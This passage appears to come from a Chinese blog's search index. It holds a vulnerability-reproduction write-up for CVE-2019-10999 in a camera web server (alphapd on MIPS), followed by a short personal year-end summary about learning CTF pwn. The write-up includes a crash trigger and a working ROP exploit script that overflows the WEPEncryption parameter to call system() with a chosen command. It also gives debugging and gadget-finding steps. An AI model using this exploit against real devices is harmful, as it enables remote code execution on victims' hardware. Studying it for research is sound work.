src="/img/CVE-2019-10999/image-20230202232330876.png"></p><p><img src="/img/CVE-2019-10999/image-20230202233507536.png"></p><p>这里我们将该判断patch掉。</p><p><img src="/img/CVE-2019-10999/image-20230203001346142.png"></p><p>反编译后，可以看到</p><p><img src="/img/CVE-2019-10999/image-20230203001432773.png"></p><h3 id="问题5"><a href="#问题5" class="headerlink" title="问题5"></a>问题5</h3><p><img src="/img/CVE-2019-10999/image-20230203135055755.png"></p><p>无法打开80端口，猜测80端口被占用了。</p><p>经过查询可知，本机的apache2服务占据了80端口。关闭apache服务即可</p><p><img src="/img/CVE-2019-10999/image-20230203135703035.png"></p><h3 id="成功启动"><a href="#成功启动" class="headerlink" title="成功启动"></a>成功启动</h3><p><img src="/img/CVE-2019-10999/image-20230203135759353.png"></p><p><img src="/img/CVE-2019-10999/image-20230203135926422.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="/img/CVE-2019-10999/image-20230203141914279.png"></p><p>通过查询该CVE，可以了解到当请求wireless.htm时，其WEPEncryption参数造成了溢出。</p><h3 id="查找溢出点"><a href="#查找溢出点" class="headerlink" title="查找溢出点"></a>查找溢出点</h3><p>通过IDA交叉引用查找溢出点。</p><p><img src="/img/CVE-2019-10999/image-20230203142401233.png"></p><p>逐个函数对比分析后，发现可疑点。</p><p><code>sub_435DEC</code></p><p><img src="/img/CVE-2019-10999/image-20230203142611718.png"></p><p>该函数获取WEPEncryption的值并赋值给Var，然后赋值给v8，最后<code>strcpy</code>赋值给v11。可以想到，通过控制a1的长度就可以造成溢出。交叉引用找到其调用者。</p><p><img src="/img/CVE-2019-10999/image-20230203143318605.png"></p><p><code>formDefineWireless</code></p><p><img src="/img/CVE-2019-10999/image-20230203143415961.png"></p><p>同时，我们在Web页面也找到了相似关键点。</p><p><img src="/img/CVE-2019-10999/image-20230203143653149.png"></p><p>并且通过抓包，我们得到相关请求头参数。</p><p><img src="/img/CVE-2019-10999/image-20230203143916185.png"></p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h4><p><img src="/img/CVE-2019-10999/image-20230203145927395.png"></p><p>由ida分析可知，当我们输入字节数大于0x10时，即可发生溢出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;en-US,en;q=0.5&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate, br&#x27;</span>,<br>    <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1/wizard.htm&#x27;</span>,<br>    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;keep-alive&#x27;</span>,<br>    <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>&#125;<br><br>session = requests.session()<br><br>ip =  <span class="hljs-string">&#x27;http://127.0.0.1/wireless.htm&#x27;</span><br>data = <span class="hljs-string">&#x27;?WEPEncryption=&#x27;</span> + <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x20</span> + <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x4</span><br><br>res = session.get(url=ip+data, headers=headers)<br><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2019-10999/image-20230203150326989.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h3><p>首先，启动漏洞程序，并开启1234端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo chroot . ./qemu-mipsel-static -E HOME=/ -E RANDFILE=/.rnd -g 1234 ./bin/alphapd<br></code></pre></td></tr></table></figure><p>其次，使用<code>gdb-multiarch</code>进行调试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">gdb-multiarch ./bin/alphapd<br>target remote :1234 <br></code></pre></td></tr></table></figure><h3 id="MIPS指令集"><a href="#MIPS指令集" class="headerlink" title="MIPS指令集"></a>MIPS指令集</h3><p>该架构为<strong>MIPS</strong>架构，其寄存器特点如下：</p><p><img src="/img/CVE-2019-10999/mips.png" alt="mips"></p><p>MIPS指令详解：<a href="https://blog.csdn.net/qq_39559641/article/details/89608132">https://blog.csdn.net/qq_39559641/article/details/89608132</a></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>首先，获取程序基址</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ps -ajx | grep alphapd<br>sudo cat /proc/pid/maps<br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2019-10999/image-20230203163644618.png"></p><p>这里无法直接得到libc地址。</p><p><img src="/img/CVE-2019-10999/image-20230203220605368.png"></p><p>通过调试，间接方法得到libc基址。</p><p>libc_base &#x3D; 0x7f6d0000</p><p><strong>其次，获取system函数的地址</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">readelf -s ./libuClibc-0.9.28.so | grep system<br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2019-10999/image-20230203164039819.png"></p><p><strong>然后，查找可用gadget</strong></p><p>这里使用IDA插件mipsrop查找。</p><p><img src="/img/CVE-2019-10999/image-20230203202234248.png"></p><p><img src="/img/CVE-2019-10999/image-20230203202351992.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:00050DE4 addiu   $s2, $sp, 0x1C8+var_D8<br>.text:00050DE8 move    $a0, $s2<br>.text:00050DEC move    $t9, $s0<br>.text:00050DF0 jalr    $t9 ; sub_505D0<br></code></pre></td></tr></table></figure><p>该gadget实现功能如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">$a0 = $sp + 0xf0# arg1<br>jalr $s0<br></code></pre></td></tr></table></figure><p>进一步分析漏洞函数<code>sub_435DEC</code></p><p><img src="/img/CVE-2019-10999/image-20230203203513410.png"></p><p><img src="/img/CVE-2019-10999/image-20230203204303574.png"></p><p><img src="/img/CVE-2019-10999/image-20230203204345277.png"></p><p>可知，</p><ol><li>函数一开始将<code>$ra, $s0-$s5</code>存储在栈上</li><li>当我们写入0x10字节时，可以控制<code>$s0</code>为system函数地址</li><li>累计写入0x28个字节后，可以控制<code>$ra</code>寄存器为gadget</li><li>接着，累计写入(0x30 + 0xf0)个字节后，可以控制<code>$a0</code>寄存器为cmd指令</li><li>跳转到system函数，从而执行任意命令。</li></ol><p>最终漏洞脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">urlcode</span>(<span class="hljs-params">data</span>):<br>    text = <span class="hljs-built_in">hex</span>(data)[<span class="hljs-number">2</span>:]<br>    temp = [<span class="hljs-string">&#x27;%&#x27;</span> + text[i] + text[i + <span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>)]<br>    res = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(temp)):<br>        res += temp[<span class="hljs-built_in">len</span>(temp) - i - <span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> res<br><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;en-US,en;q=0.5&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate, br&#x27;</span>,<br>    <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1/wizard.htm&#x27;</span>,<br>    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;keep-alive&#x27;</span>,<br>    <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>&#125;<br><br>session = requests.session()<br><br>libc_base = <span class="hljs-number">0x7f6d0000</span><br>system = libc_base + <span class="hljs-number">0x4bd20</span><br>gadget = libc_base + <span class="hljs-number">0x50de4</span><br><br>cmd = <span class="hljs-string">&#x27;ls&#x27;</span><br><br>ip =  <span class="hljs-string">&#x27;http://127.0.0.1/wireless.htm&#x27;</span><br>data = <span class="hljs-string">&#x27;?WEPEncryption=&#x27;</span> + <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span> + urlcode(system)<br>data += <span class="hljs-string">&#x27;B&#x27;</span> * (<span class="hljs-number">0x28</span> - <span class="hljs-number">0x14</span>) + urlcode(gadget)<br>data += <span class="hljs-string">&#x27;C&#x27;</span> * (<span class="hljs-number">0x30</span> - <span class="hljs-number">0x2c</span> + <span class="hljs-number">0x1c8</span> - <span class="hljs-number">0xd8</span>) + cmd<br><br>url = ip + data<br><br>res = session.get(url=url, headers=headers)<br><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p>可以看到，我们成功执行了远程命令。</p><p><img src="/img/CVE-2019-10999/image-20230203223710418.png"></p><p><img src="/img/CVE-2019-10999/image-20230203223744429.png"></p><p>这里<code>$sp</code>的变化，是在跳转到gadget前，优先执行<code>addiu $sp, 0x48</code>指令，也即gadget的下一条指令。这个叫做<strong>分支延迟槽 (Branch delay slot)<strong>，简单地说就是位于分支指令后面的一条指令，不管分支发生与否其总是被执行，而且</strong>位于分支延迟槽中的指令先于分支指令提交</strong> (commit)。</p><p><img src="/img/CVE-2019-10999/image-20230203221509179.png"></p><p><img src="/img/CVE-2019-10999/image-20230203221531500.png"></p><p><strong>参考文档：</strong></p><p><a href="https://www.anquanke.com/post/id/259210">https://www.anquanke.com/post/id/259210</a></p><p><a href="https://blog.csdn.net/qq_39559641/article/details/89608132">https://blog.csdn.net/qq_39559641/article/details/89608132</a></p><p><a href="https://blog.csdn.net/qq_39559641/article/details/89608132">https://blog.csdn.net/qq_39559641/article/details/89608132</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>mips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022-summary</title>
    <link href="/2023/01/21/2022-summary/"/>
    <url>/2023/01/21/2022-summary/</url>
    
    <content type="html"><![CDATA[<blockquote><p>一直想写一篇年终总结，但是一直耽耽误误的。这一篇也是写了好久才写出来的。</p></blockquote><p>哈哈，首先给自己来一个新年祝福吧。</p><p>希望新的一年里所求皆如愿，所行化坦途。多喜乐，长安宁！！！</p><h2 id="经历"><a href="#经历" class="headerlink" title="经历"></a>经历</h2><p> 对我而言，今年既是平常又是极不平常的一年。或许某些选择改变了我的人生方向。</p><p>年初，1月10号左右，我开始接触CTF。CTF方向很多，一开始我也不知道从哪个方向入手，于是就逐个方向慢慢尝试。大概试了一个星期左右吧，我发现更喜欢PWN方向，觉得找到程序漏洞，然后直接控制远程主机很厉害。然后网上很多大佬都认为二进制方向很有前景，于是就选择了PWN。</p><p>刚开始时，真的是很懵啊！！！自己啥也不懂，完全就是一个小白。于是就开始慢慢摸索，学习汇编语言，学习函数调用过程等等。其中，我对堆栈总是一知半解的，但是就是硬着头皮做题嘛，并且不断画程序调用堆栈图，直到自己理解了为止。经历了一个寒假，我算是入门了PWN。</p><p>开学时，参加了第一个CTF比赛，挺激动的吧，但是压根就看不懂题啊。只能继续刷BUUCTF了。然后，参加了学院举办的峻极争霸赛，这里面的PWN题比较简单，我做了三四道吧，依稀记得是两道栈，一道格式化字符串，还有一个简单的堆题，最后我们队伍拿了三等奖。之后，我不断刷题，不断学习新知识，并且参加一些CTF比赛。由于参加的CTF比赛比较多，但是都没有拿到成绩嘛，也就不说了。</p><p>综上，入门CTF，走安全道路，并为之付出大量时间是我今年做出的最大选择。</p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ol><li>学习了汇编语言</li><li>学习了栈、libc堆(house系列，堆利用技巧)、kernel(菜的一批)、musl libc(刚入门)</li><li>编程水平有了一定提升</li></ol><h2 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h2><p>不足之处太多了，也就不一一列举了。这里稍微列举几个自己今年想要改的，也就是一个flag。</p><ol><li>阅读代码能力不太行，好多PWN题都分析不出bug</li><li>做题时比较浮躁，缺乏耐心</li></ol><h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>希望未来能够挖到第一个CVE漏洞，并且CTF比赛能够打出成绩。</p><p>就这么多了吧，实在是没啥好写的了。</p>]]></content>
    
    
    <categories>
      
      <category>summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>personal</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
